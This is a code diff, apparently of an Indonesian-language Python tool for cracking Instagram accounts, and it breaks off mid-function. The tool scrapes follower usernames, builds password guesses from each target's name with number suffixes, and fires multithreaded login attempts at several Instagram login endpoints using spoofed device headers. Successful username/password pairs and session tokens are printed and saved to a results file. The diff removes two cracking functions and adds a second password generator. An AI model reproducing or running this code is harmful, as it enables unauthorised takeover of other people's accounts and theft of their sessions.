@@ -173,10 +173,11 @@ def InstagramX():
 	merek_ios =rc(["iPhone7,2", "iPhone8,1", "iPhone9,4", "iPhone9,1", "iPhone9,4", "iPhone7,2", "iPhone10,4", "iPhone9,3", "iPhone10,5", "iPhone7,2", "iPhone8,1", "iPhone9,3", "iPhone10,4", "iPhone9,3", "iPhone8,2", "iPhone10,5", "iPhone8,4", "iPhone6,1", "iPhone8,4", "iPhone10,6", "iPhone6,2", "iPhone4,1", "iPhone10,5", "iPhone8,1", "iPhone10,5", "iPhone6,1", "iPhone4,1", "iPhone8,1", "iPhone5,1", "iPhone5,2", "iPhone8,1", "iPhone7,2", "iPhone7,2", "iPhone7,2", "iPhone10,6", "iPhone10,3", "iPhone6,2", "iPhone8,1", "iPhone5,1", "iPhone6,2", "iPhone6,2", "iPhone8,1", "iPhone9,4", "iPhone10,5", "iPhone9,3", "iPhone9,3", "iPhone7,2", "iPhone4,1", "iPhone6,2", "iPhone10,6", "iPhone7,2", "iPhone8,1", "iPhone9,3", "iPhone8,1", "iPhone8,1", "iPhone8,1", "iPhone9,3", "iPhone6,2", "iPhone8,1", "iPhone9,4", "iPhone8,2", "iPhone7,2", "iPhone8,1", "iPhone10,5", "iPhone6,2", "iPhone8,1", "iPhone9,4", "iPhone10,6", "iPhone9,1", "iPhone8,1", "iPhone9,3", "iPhone8,1", "iPhone6,1", "iPhone6,1"])
 	version_lang = rc(["pt_PT", "pt_PT", "en_US", "uk_UA", "ru_RU", "de_DE", "de_DE", "hu_HU", "ru_RU", "ru_RU", "ru_UA", "ru_UA", "ru_UA", "ru_US", "uk_UA", "de_DE", "uk_UA", "ru_UA", "ru_UA", "en_US", "ru_UA", "ru_UA", "de_DE", "en_UA", "de_DE", "uk_UA", "uk_UA", "uk_UA", "uk_UA", "ru_RU", "de_DE", "ru_UA", "ru_UA", "ru_US", "ru_UA", "ru_UA", "ru_UA", "en_PT", "pt_PT", "pt_PT", "pt_PT", "en_UA", "de_DE", "en_UA", "ru_BY", "ru_UA", "ru_UA", "de_DE", "uk_UA", "ru_UA", "ru_UA", "ru_UA", "ru_RU", "ru_US", "ru_UA", "uk_UA", "de_DE", "uk_UA", "ru_RU", "tr_TR", "de_DE", "ru_UA", "ru_RU", "ru_RU", "ru_UA", "fr_FR", "en_PH", "ru_CZ", "en_UA", "ru_UA", "ru_UA", "ru_UA", "ru_UA", "ru_UA"])
 	gamut_ios= rc(["normal", "wide"])
+	code = random.choice(['370911961','370911964','370911965','370911966','370911967','370911968','370911971','370911972','370911973','370911974','370911975','370911976','370911977','371025731'])
 	pixel = rc(["750x1331", "1440x2560","1080x1920","750x1334","960x640"])
 	merek_version = rc(["LGE/lge", "LENOVO/Lenovo","zerolte","LGE/google","MX6","HUAWEI","samsung"])
-	android = f'Mozilla/5.0 (Linux; Android {version_android}; {merek_android} Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{cromonium_android} Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (23/6.0.1; 640dpi; {pixel}; {merek_version}; {merek_android}; trlte; qcom; pt_PT; 98288242)'
-	ios = f'Mozilla/5.0 (iPhone; CPU iPhone OS  like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone7,2; iOS 11_2_6; pt_PT; pt-PT; scale=2.34; gamut=normal; 750x1331)'
+	android = f'Mozilla/5.0 (Linux; Android {version_android}; {merek_android} Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{cromonium_android} Mobile Safari/537.36 Instagram {cromonium_android} Android (23/6.0.1; 640dpi; {pixel}; {merek_version}; {merek_android}; trlte; qcom; {version_lang}; {code})'
+	ios = f'Mozilla/5.0 (iPhone; CPU iPhone OS {version_ios} like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) {mobile_ios} Instagram {cromonium_android} ({merek_ios}; iOS {mobile_ios}; {version_lang}; {version_lang}; scale={ipad_ios}; gamut={gamut_ios}; {pixel})'
 	res = rc([android,ios])
 	return res
 
@@ -447,6 +448,7 @@ def Graphql(typess, userid, cokie,after):
                 Uuid.append(xy)
                 print('\r└──╭➣ Mendapatkan ID {}'.format(len(Uuid)), end='')
                 time.sleep(0.0009)
+                open('dump.txt', 'w').write('\n'.join(Uuid))
         end = req['data']['user'][khm]['page_info']['has_next_page']
         if end is True:
             after = req['data']['user'][khm]['page_info']['end_cursor']
@@ -458,11 +460,11 @@ def Graphql(typess, userid, cokie,after):
 def Metode(): 
 	global Login_Dengan
 	prints(Panel(f"{P2}Total Username Terkumpul : [bold green]{len(Uuid)}[bold white]",width=80,padding=(0,20),style=f"bold blue"))
-	tabel1 = f"[bold white]01\n02\n03\n04"
+	tabel1 = f"[bold white]01\n02"
 	tabel2 = (
-		f"[bold white]Instagram Metode [ www.instagram.com ]\nInstagram Metode [ i.instagram.com/v1 ]\nInstagram Metode [ i.instagram.com/ajax ]\nInstagram Metode [ www.instagram.com/v2 ]"
+		f"[bold white]Instagram Metode [ i.instagram.com/ajax ]\nInstagram Metode [ z-p42.wwww.instagram.com/v1 ]"
 	)
-	tabel3 = f"[bold white]ON\nON\nON\nON"
+	tabel3 = f"[bold white]ON\nON"
 	colume_tabel = me()
 	colume_tabel.add_column("NO", style="bold green", justify='center')
 	colume_tabel.add_column("PILIHAN", style="bold green", justify='center', width=55)
@@ -472,26 +474,30 @@ def Metode():
 	method = input('└──╭➣ Pilih Metode 1 Sampai 4: ')
 	if method in ['01','1']: Login_Dengan = "api.instagram.com"
 	elif method in ['02','2']: Login_Dengan = "i.instagram.com"
-	elif method in ['03','3']: Login_Dengan = "www.instagram.com"
-	elif method in ['04','4']: Login_Dengan = "web.instagram.com"
 	else:Login_Dengan = "api.instagram.com"
 	SetCrack()
 
 def SetCrack():
-	prints(Panel(f"{P2}Crack Di Mulai Tekan [bold green]'Ctrl+Z'{P2} Di Keyboard Anda Jika Ingin Berhenti\n\n        {P2}Hidupkan Mode Pesawat 5 Detik Jika Terdeteksi Spam IP",width=80,padding=(0,4),style=f"bold blue"))
+	Meledak = []
+	Meledak.append(Panel.fit(f"[bold white]1. Password List [ v1 ]",style="bold green"))
+	Meledak.append(Panel.fit(f"[bold white]2. Password List [ v2 ]",style="bold green"))
+	prints(Columns(Meledak))
+	passlist = input('└──╭➣ Pilih Metode 1 dan 2: ')
+	if passlist in ['01','1']:
+		Password(name)
+	elif passlist in ['02','2']:
+		Password2(name)
+	else:
+		Password(name)
+	prints(Panel.fit(f"{P2}Crack Di Mulai Tekan [bold green]'Ctrl+Z'{P2} Di Keyboard Anda Jika Ingin Berhenti\n{P2}Hidupkan Mode Pesawat 5 Detik Jika Terdeteksi Spam IP",padding=(0,2),style=f"bold blue"))
 	with ThreadPoolExecutor (max_workers=30) as ASF:
 		for i in Uuid:
 			try:
 				username, name = i.split('|')
-				kontol = Password(name)
 				if Login_Dengan == "api.instagram.com":
-					ASF.submit(Crack_api, username, kontol)
+					ASF.submit(crack_ajax, username, passlist)
 				elif Login_Dengan == "i.instagram.com":
-					ASF.submit(Crack_i, username, kontol)
-				elif Login_Dengan == "www.instagram.com":
-					ASF.submit(crack_ajax, username, kontol)
-				elif Login_Dengan == "web.instagram.com":
-					ASF.submit(crack, username, kontol)
+					ASF.submit(crack, username, passlist)
 			except:pass
 	exit(' \n\n Crack Telah Selesai')
 	
@@ -525,131 +531,32 @@ def Password(name):
 			xxzx.append('Bengkulu')
 	return xxzx
 
-def Crack_api(username, memek):
-	global Ok, Cp, Loop
-	sys.stdout.write(f"\rRuning [ {Loop} ] Mendapatkan [ {str(len(Uuid))} ]  Success [ {Ok} ] Failed [ {Cp} ]"),
-	sys.stdout.flush()
-	for password in memek:
-		try:
-			ses = requests.Session()
-			useragent = UserAgentApp()
-			device_id = str(uuid.uuid4())
-			_hash = hashlib.md5()
-			_hash.update(username.encode('utf-8') + password.encode('utf-8'))
-			hex_ = _hash.hexdigest()
-			_hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
-			data = {'signed_body': 'aa792afa7c0f5b1680531edb1681750fcc45a3718142c399d2420291431be7f1.{"id":"'+str(device_id)+'","server_config_retrieval":"1","experiments":"ig_android_fci_onboarding_friend_search,ig_android_device_detection_info_upload,ig_android_sms_retriever_backtest_universe,ig_android_direct_add_direct_to_android_native_photo_share_sheet,ig_growth_android_profile_pic_prefill_with_fb_pic_2,ig_account_identity_logged_out_signals_global_holdout_universe,ig_android_login_identifier_fuzzy_match,ig_android_reliability_leak_fixes_h1_2019,ig_android_video_render_codec_low_memory_gc,ig_android_push_fcm,ig_android_show_login_info_reminder_universe,ig_android_email_fuzzy_matching_universe,ig_android_one_tap_aymh_redesign_universe,ig_android_direct_send_like_from_notification,ig_android_suma_landing_page,ig_android_direct_main_tab_universe,ig_android_login_forgot_password_universe,ig_android_session_scoped_logger,ig_android_smartlock_hints_universe,ig_android_account_switch_infra_universe,ig_android_video_ffmpegutil_pts_fix,ig_android_multi_tap_login_new,ig_android_caption_typeahead_fix_on_o_universe,ig_android_save_pwd_checkbox_reg_universe,ig_android_nux_add_email_device,ig_username_suggestions_on_username_taken,ig_android_analytics_accessibility_event,ig_android_ingestion_video_support_hevc_decoding,direct_app_deep_linking_universe,ig_android_account_recovery_auto_login,ig_android_feed_cache_device_universe2,ig_android_sim_info_upload,ig_android_mobile_http_flow_device_universe,ig_account_recovery_via_whatsapp_universe,ig_android_hide_fb_button_when_not_installed_universe,ig_android_targeted_one_tap_upsell_universe,ig_android_gmail_oauth_in_reg,ig_android_native_logcat_interceptor,ig_android_hide_typeahead_for_logged_users,ig_android_vc_interop_use_test_igid_universe,ig_android_reg_modularization_universe,ig_android_phone_edit_distance_universe,ig_android_device_verification_separate_endpoint,ig_android_universe_noticiation_channels,ig_smartlock_login,ig_android_account_linking_universe,ig_android_hsite_prefill_new_carrier,ig_android_retry_create_account_universe,ig_android_family_apps_user_values_provider_universe,ig_android_reg_nux_headers_cleanup_universe,ig_android_device_info_foreground_reporting,ig_fb_invite_entry_points,ig_android_device_verification_fb_signup,ig_android_onetaplogin_optimization,ig_video_debug_overlay,ig_android_ask_for_permissions_on_reg,ig_assisted_login_universe,ig_android_display_full_country_name_in_reg_universe,ig_android_security_intent_switchoff,ig_android_device_info_job_based_reporting,ig_android_passwordless_auth,ig_android_direct_main_tab_account_switch,ig_android_modularized_dynamic_nux_universe,ig_android_fb_account_linking_sampling_freq_universe,ig_android_fix_sms_read_lollipop,ig_android_access_flow_prefill"}','ig_sig_key_version': '4'}
-			ses.headers.update({'X-Pigeon-Session-Id': str(uuid.uuid4()),'X-Pigeon-Rawclienttime': str(round(time.time(), 3)),'X-IG-Connection-Speed': '-1kbps','X-IG-Bandwidth-Speed-KBPS': '-1.000','X-IG-Bandwidth-TotalBytes-B': '0','X-IG-Bandwidth-TotalTime-MS': '0','X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0','X-IG-Connection-Type': 'MOBILE(LTE)','X-IG-Capabilities': '3brTvw==','X-IG-App-ID': '567067343352427','User-Agent': useragent,'Accept-Language': 'id-ID, en-US','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Accept-Encoding': 'gzip, deflate','Host': 'i.instagram.com','X-FB-HTTP-Engine': 'Liger','Connection': 'keep-alive','Content-Length': str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items() ]))),})
-			response = ses.post('https://i.instagram.com/api/v1/qe/sync/', data = data)
-			try:
-				_csrftoken = ses.cookies.get_dict()['csrftoken']
-			except Exception as e:
-				_csrftoken = ('')
-			ses.headers.update({'Cookie': ("; ".join([str(x)+"="+str(y) for x,y in ses.cookies.get_dict().items()])),'X-Pigeon-Rawclienttime': str(round(time.time(), 3)),'Content-Length': str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items() ]))),'Connection': 'keep-alive',})
-			data = (f'signed_body=c47e37e1131fb044652977e468f13e6139bbd66e437069921457f7afb70bcdba\
-						.%7B%22country_codes%22%3A%22%5B%7B%5C%22country_code%5C%22%3A%5C%2262%5C%22%2C%5C%22source%5C%22%3A%5B%5C%22default%5C%22%5D%7D%5D%22%2C%22phone_id%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22_csrftoken%22%3A%22{urllib.request.quote(str(_csrftoken))}%22%2C%22username%22%3A%22{urllib.request.quote(str(username))}%22%2C%22adid%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22guid%22%3A%22{urllib.request.quote(str(device_id))}%22%2C%22device_id%22%3A%22android-{urllib.request.quote(str(_hash.hexdigest()[:16]))}%22%2C%22google_tokens%22%3A%22%5B%5D%22%2C%22password%22%3A%22{urllib.request.quote(str(password))}%22%2C%22login_attempt_count%22%3A%221%22%7D&ig_sig_key_version=4')
-			response2 = ses.post('https://i.instagram.com/api/v1/accounts/login/',data=data, allow_redirects = True)
-			if 'Bearer IGT:2:' in str(response2.text.replace('\\', '')) and '"pk_id":' in str(response2.text.replace('\\', '')):
-				try:
-					ig_set_authorization = re.search('"IG-Set-Authorization": "(.*?)"', str(response2.text.replace('\\', ''))).group(1)
-					try:
-						decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(ig_set_authorization.split('Bearer IGT:2:')[1]))
-						cookies = (";".join([str(x) + "=" + str(y) for x, y in decode_ig_set_authorization.items()]))
-					except Exception as e:
-						cookies = ('-')
-				except Exception as e:
-					ig_set_authorization = (None)
-				Ok += 1
-				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
-				print(f"                                                                ", end='\r')
-				time.sleep(0.10)
-				tree = Tree(Panel.fit(f"{H2}{fullname}{P2}"))
-				tree.add(Panel.fit(f"{P2}Username : {H2}{username}")).add(Panel.fit(f"{P2}Password : {H2}{password}"))
-				tree.add(Panel.fit(f"{P2}Followers : {H2}{peng}")).add(Panel.fit(f"{P2}Following : {H2}{meng}"))
-				tree.add(Panel.fit(f"{N2}{ig_set_authorization}{cookies}{P2}"))
-				prints(tree)
-				open('RESULTS-INSTAGRAM/'+Okc, 'a').write(f"{username}|{password}|{peng}")
-				break
-			elif 'challenge_required' in str(response2.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response2.text.replace('\\', '')):
-				Cp += 1
-				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
-				print(f"                                                                ", end='\r')
-				time.sleep(0.10)
-				tree = Tree(Panel.fit(f"{K2}{fullname}{P2}"))
-				tree.add(Panel.fit(f"{P2}Username : {K2}{username}")).add(Panel.fit(f"{P2}Password : {K2}{password}"))
-				tree.add(Panel.fit(f"{P2}Followers : {K2}{peng}")).add(Panel.fit(f"{P2}Following : {K2}{meng}"))
-				tree.add(Panel.fit(f"{N2}{useragent}{P2}"))
-				prints(tree)
-				open('RESULTS-INSTAGRAM/'+Cpc, 'a').write(f"{username}|{password}|{peng}")
-				break
-			else:
-				continue
-		#except Exception as e:print(e)
-		except requests.exceptions.ConnectionError:time.sleep(20)
-	Loop+=1
-
-def Crack_i(username, memek):
-	global Ok, Cp, Loop
-	bo = random.choice([u])
-	sys.stdout.write(f"\rRuning [ {Loop} ] Mendapatkan [ {str(len(Uuid))} ] [ {str(username)[:6]} ] Success [ {Ok} ] Failed [ {Cp} ]"),
-	sys.stdout.flush()
-	for password in memek:
-		try:
-			ua = UserAgentApp()
-			ses = requests.Session()
-			device_id, family_device_id = str(uuid.uuid4()), str(uuid.uuid4())
-			_hash = hashlib.md5()
-			_hash.update(username.encode('utf-8') + password.encode('utf-8'))
-			hex_ = _hash.hexdigest()
-			_hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
-			ses.headers.update({'authority': 'i.instagram.com','x-bloks-version-id': '8dab28e76d3286a104a7f1c9e0c632386603a488cf584c9b49161c2f5182fe07','x-bloks-is-layout-rtl': 'false','x-ig-capabilities': '3brTv10=','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','x-ig-connection-type': 'MOBILE(LTE)','x-ig-bandwidth-totaltime-ms': '0','x-ig-www-claim': '0','x-ig-bandwidth-totalbytes-b': '0','x-ig-mapped-locale': 'id_ID','x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),'x-ig-app-locale': 'in_ID','x-ig-bandwidth-speed-kbps': '-1.000','user-agent': ua,'x-ig-family-device-id': family_device_id,'x-fb-connection-type': 'MOBILE.LTE','x-ig-device-id': device_id,'x-fb-server-cluster': 'True','x-fb-http-engine': 'Liger','ig-intended-user-id': '0','x-ig-app-id': '567067343352427','x-ig-android-id': f'android-{_hash.hexdigest()[:16]}','x-ig-timezone-offset': str(-time.timezone),'priority': 'u=3','x-ig-device-locale': 'in_ID','x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0','x-fb-client-ip': 'True',})
-			data = (f'signed_body=SIGNATURE.%7B%22country_codes%22%3A%22%5B%7B%5C%22country_code%5C%22%3A%5C%2262%5C%22%2C%5C%22source%5C%22%3A%5B%5C%22default%5C%22%5D%7D%5D%22%2C%22phone_id%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22enc_password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{str(int(datetime.datetime.now().timestamp()))}%3A{urllib.request.quote(str(password))}%3D%22%2C%22username%22%3A%22{urllib.request.quote(str(username))}%22%2C%22adid%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22guid%22%3A%22{urllib.request.quote(str(device_id))}%22%2C%22device_id%22%3A%22android-{urllib.request.quote(str(_hash.hexdigest()[:16]))}%22%2C%22google_tokens%22%3A%22%5B%5D%22%2C%22login_attempt_count%22%3A%220%22%7D')
-			response = ses.post('https://b.i.instagram.com/api/v1/accounts/login/', data=data)
-			if 'logged_in_user' in str(response.text) and '"pk_id":' in str(response.text):
-				ig_set_authorization = f"{response.headers.get('ig-set-authorization')}"
-				Ok += 1
-				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
-				print(f"                                                                ", end='\r')
-				time.sleep(0.10)
-				tree = Tree(Panel.fit(f"{H2}{fullname}{P2}"))
-				tree.add(Panel.fit(f"{P2}Username : {H2}{username}")).add(Panel.fit(f"{P2}Password : {H2}{password}"))
-				tree.add(Panel.fit(f"{P2}Followers : {H2}{peng}")).add(Panel.fit(f"{P2}Following : {H2}{meng}"))
-				tree.add(Panel.fit(f"{N2}{ig_set_authorization}{P2}"))
-				prints(tree)
-				open('RESULTS-INSTAGRAM/'+Okc, 'a').write(f"{username}|{password}|{peng}")
-				break
-			elif 'checkpoint' in str(response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response.text.replace('\\', '')):
-				Cp += 1
-				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
-				print(f"                                                                ", end='\r')
-				time.sleep(0.10)
-				tree = Tree(Panel.fit(f"{K2}{fullname}{P2}"))
-				tree.add(Panel.fit(f"{P2}Username : {K2}{username}")).add(Panel.fit(f"{P2}Password : {K2}{password}"))
-				tree.add(Panel.fit(f"{P2}Followers : {K2}{peng}")).add(Panel.fit(f"{P2}Following : {K2}{meng}"))
-				tree.add(Panel.fit(f"{N2}{ua}{P2}"))
-				prints(tree)
-				open('RESULTS-INSTAGRAM/'+Cpc, 'a').write(f"{username}|{password}|{peng}")
-				break
-			else:
-				continue
-		except requests.exceptions.ConnectionError:
-			time.sleep(20)
-	Loop += 1
-
-def cookie_bearer(cookie):
-	abcd = json.loads(base64.b64decode(cookie).decode())
-	coki = ';'.join(['%s=%s' % (x, y) for x, y in abcd.items()])
-	return coki + f';dpr=2;ig_did={str(uuid.uuid4()).upper()}'
-
-def x_mid(mid_list):
-	if len(mid_list) > 0:
-		return random.choice(mid_list)
-	lr = 'abcdefghijklmnopqrstuvwxyz1234567890'
-	xc = ''.join(random.choice(lr.upper()) for _ in range(6))
-	return f'ZpFI1wABAAET6tZpG_yS09{xc}'
-
-
-
+def Password2(name):
+    xxzx = []
+    full_name = name.replace('_', ' ').replace('.', ' ').replace('@', ' ')
+    for nama in full_name.split():
+        if len(nama) < 3:
+            continue
+        base_name = nama.capitalize()
+        xxzx.append(base_name)
+        xxzx.append(base_name.lower())
+        for i in range(1, 101):
+            xxzx.append(f"{base_name}{i:02}")
+            xxzx.append(f"{base_name.lower()}{i:02}")
+        if len(nama) >= 4:
+            xxzx.extend([
+                f"{base_name}12",
+                f"{base_name.lower()}12",
+                f"{base_name}123",
+                f"{base_name.lower()}123",
+                f"{base_name}1234",
+                f"{base_name.lower()}1234",
+                f"{base_name}12345",
+                f"{base_name.lower()}12345",
+                f"{base_name}123456",
+                f"{base_name.lower()}123456"
+            ])
+    return xxzx
 def crack_ajax(username, memek):
 	global Ok, Cp, Loop
 	sys.stdout.write(f"\rRuning [ {Loop} ] Mendapatkan [ {str(len(Uuid))} ] [ {str(username)[:6]} ] Success [ {Ok} ] Failed [ {Cp} ]"),
@@ -657,13 +564,12 @@ def crack_ajax(username, memek):
 	for password in memek:
 		try:
 			ses = requests.Session()
-			uag = UserAgentApp()
+			uag = InstagramX()
 			device_id, family_device_id = str(uuid.uuid4()), str(uuid.uuid4())
 			_hash = hashlib.md5()
 			_hash.update(username.encode('utf-8') + password.encode('utf-8'))
 			hex_ = _hash.hexdigest()
 			_hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
-			# Update headers
 			headers = {
 				'host': 'i.instagram.com',
 				'x-ig-app-locale': 'en_US',
@@ -676,6 +582,7 @@ def crack_ajax(username, memek):
 				'x-ig-bandwidth-totaltime-ms': '0',
 				'x-bloks-version-id': '9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a',
 				'x-ig-www-claim': '0',
+				'x-ig-www-claim-v2':'hmac.AR1JRO-r750XvzzKF-U-WVrXk1HS89qTOUcvnN6u9DpRZfeK',
 				'x-bloks-is-prism-enabled': 'false',
 				'x-bloks-is-layout-rtl': 'false',
 				'x-ig-device-id': device_id,
@@ -695,24 +602,23 @@ def crack_ajax(username, memek):
 				'x-fb-http-engine': 'Liger',
 				'x-fb-client-ip': 'True',
 				'x-fb-server-cluster': 'True',
-				'x-requested-with': 'com.instagram.android',
+				'x-requested-with': f'{random.choice(["com.instagram.lite","com.instagram.android","com.facebook.appmanager"])}',
 				'Connection': 'keep-alive'}
 			ses.headers.update(headers)
 			data = (f'params=%7B %22client_input_params%22%3A%7B%22device_id%22%3A%22{device_id}%22%2C%22name%22%3A%22{username}%22%2C%22machine_id%22%3A%22{str(uuid.uuid4())}%22%2C%22contact_point%22%3A%22{username}%22%2C%22encrypted_password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{round(time.time())}%3A{password}%22%7D%7D&bk_client_context=%7B%22bloks_version%22%3A%229fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a')
 			response = ses.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request/', data=data, allow_redirects=True)
-
-			if 'Bearer IGT:2:' in str(response.text.replace('\\', '')) and '"pk_id":' in str(response.text.replace('\\', '')) or "logged_in_user" in str(response.text.replace('\\', '')):
+			if 'Bearer IGT:2:' in str(response.text.replace('\\', '')) and '"pk_id":' in str(response.text.replace('\\', '')):
 				try:
 					ig_set_authorization = re.search('"IG-Set-Authorization": "(.*?)"', str(response.text.replace('\\', ''))).group(1)
 					try:
 						decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(ig_set_authorization.split('Bearer IGT:2:')[1]))
-					except Exception:
-						cookies = '-'
-				except Exception:
-					ig_set_authorization = None
-
+						cookies = (";".join([str(x) + "=" + str(y) for x, y in decode_ig_set_authorization.items()]))
+					except Exception as e:
+						cookies = ('-')
+				except Exception as e:
+					ig_set_authorization = (None)
 				Ok += 1
-				post, peng, meng, mail, fullname, fbid, phone = data_target(username)  # Pastikan data_target didefinisikan
+				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
 				print(f"                                                                ", end='\r')
 				time.sleep(0.10)
 				tree = Tree(Panel.fit(f"{H2}{fullname}{P2}"))
@@ -720,7 +626,7 @@ def crack_ajax(username, memek):
 				tree.add(Panel.fit(f"{P2}Followers : {H2}{peng}")).add(Panel.fit(f"{P2}Following : {H2}{meng}"))
 				tree.add(Panel.fit(f"{N2}{ig_set_authorization}{cookies}{P2}"))
 				prints(tree)
-				open(f'RESULTS-INSTAGRAM/{Okc}', 'a').write(f"{username}|{password}|{peng}")
+				open('RESULTS-INSTAGRAM/'+Okc, 'a').write(f"{username}|{password}|{peng}")
 				break
 			elif 'challenge_required' in str(response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response.text.replace('\\', '')):
 				Cp += 1
@@ -729,72 +635,85 @@ def crack_ajax(username, memek):
 				time.sleep(0.10)
 				tree = Tree(Panel.fit(f"{K2}{fullname}{P2}"))
 				tree.add(Panel.fit(f"{P2}Username : {K2}{username}")).add(Panel.fit(f"{P2}Password : {K2}{password}"))
-				tree.add(Panel.fit(f"{P2}Followers : {K2}{peng}")).add(Panel.fit(f"{P2}Following : {K2}{meng}"))
-				tree.add(Panel.fit(f"{N2}{ua}{P2}"))
+				tree.add(Panel.fit(f"{P2}Followers : {K2}{peng}")).add(Panel.fit(f"{P2}Following : {K2}{meng}")).add(Panel.fit(f"{P2}Following : {K2}{uag}"))
 				prints(tree)
-				open(f'RESULTS-INSTAGRAM/{Cpc}', 'a').write(f"{username}|{password}|{peng}")
+				open('RESULTS-INSTAGRAM/'+Cpc, 'a').write(f"{username}|{password}|{peng}")
 				break
 			else:
 				continue
-		except requests.exceptions.ConnectionError:
-			time.sleep(20)
-	Loop += 1
+		#except Exception as e:print(e)
+		except requests.exceptions.ConnectionError:time.sleep(20)
+	Loop+=1
 
 def crack(username, memek):
 	global Ok, Cp, Loop
 	sys.stdout.write(f"\rRuning [ {Loop} ] Mendapatkan [ {str(len(Uuid))} ] [ {str(username)[:6]} ] Success [ {Ok} ] Failed [ {Cp} ]"),
-	sys.stdout.flush()    
-	for password in memek:
-		try:
-			url = 'https://www.instagram.com/accounts/login/ajax/'
-			response = ses.get('https://www.instagram.com/accounts/login/', headers=headers_log)
-			csrf_token = response.cookies.get('csrftoken')
-			login_headers = {
-				'User-Agent': generate_random_ua(),
-				'X-CSRFToken': csrf_token,
-				'Accept': 'application/json, text/javascript, */*; q=0.01',
-				'Accept-Encoding': 'gzip, deflate, br',
-				'Accept-Language': 'en-US,en;q=0.9',
+	sys.stdout.flush()
+	ua = InstagramX()
+	try:
+		for pw in memek:
+			p = ses.get('https://z-p42.www.instagram.com/accounts/login')
+			head = {
+				'Host': 'z-p42.www.instagram.com',
+				'Content-Length': '1102',
+				'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
+				'cache-control'     : 'no-cache',
+				'X-IG-App-ID': '1217981644879628',
+				'X-Instagram-AJAX': '0539e7c8538b',
 				'Content-Type': 'application/x-www-form-urlencoded',
+				'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
 				'X-Requested-With': 'XMLHttpRequest',
-				'Referer': 'https://www.instagram.com/accounts/login/',
-			}
-
+				'X-ASBD-ID': '198387',
+				'User-Agent': ua,
+				'X-CSRFToken': p.cookies['csrftoken'],
+				'Origin': 'https://z-p42.www.instagram.com',
+				'viewport-width'    : '400', 
+				'Accept-Encoding':	'gzip, deflate, br, zstd',
+				'Accept-Language': 'en-US,en;q=0.9'}
 			data = {
-				'username': username,
-				'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1605155817:{password}',  # Format the password with timestamp
-			}
-
-			login_response = ses.post(url, headers=login_headers, data=data, cookies={'csrftoken': csrf_token})
-			if 'Bearer IGT:2:' in str(login_response.text.replace('\\', '')) and '"pk_id":' in str(login_response.text.replace('\\', '')) or "logged_in_user" in str(login_response.text.replace('\\', '')):
-				x = ses.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s" % username, headers={"user-agent": generate_random_ua(), "x-ig-app-id": '936619743392459'})
-				x_json = x.json()["data"]["user"]
-				pengikut = x_json["edge_followed_by"]["count"]
-				mengikut = x_json["edge_follow"]["count"]
-				postingan = x_json["edge_owner_to_timeline_media"]["count"]
-				cookie = ";".join([key + "=" + value.replace('"', '') for key, value in ses.cookies.get_dict().items()])
-				print(f"\n{B}{username} {password}{N}")
-				print(f"{H}Followers: {O}{pengikut}{N}")
-				print(f"{H}Posts: {O}{postingan}{N}")
-				print(f"{H}Following: {O}{mengikut}{N}")
-				print(f"{B}Cookies:{N}\n{P}{cookie}{N}")
-			elif 'challenge_required' in str(login_response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(login_response.text.replace('\\', '')):
+				"enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{random.randint(1000000000, 99999999999)}:{pw}",
+				"username": username,
+				"queryParams": "{}",
+				"optIntoOneTap": 'false',
+				"stopDeletionNonce": "",
+				"trustedDeviceRecords": "{}"}
+			respon=ses.post("https://z-p42.www.instagram.com/api/v1/web/accounts/login/ajax/", headers = head, data = data, allow_redirects = False)
+			meledak_code = json.loads(respon.text)
+			if 'logged_in_user' in str(meledak_code) or 'href="https://i.instagram.com/accounts/onetap/?next=%2F"' in str(meledak_code) or 'sessionld' in str(meledak_code):
+				Ok += 1
+				x = ses.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(username),headers={"user-agent":UserAgentApp(),"x-ig-app-id":'936619743392459'})
+				x_jason = x.json()["data"]["user"]
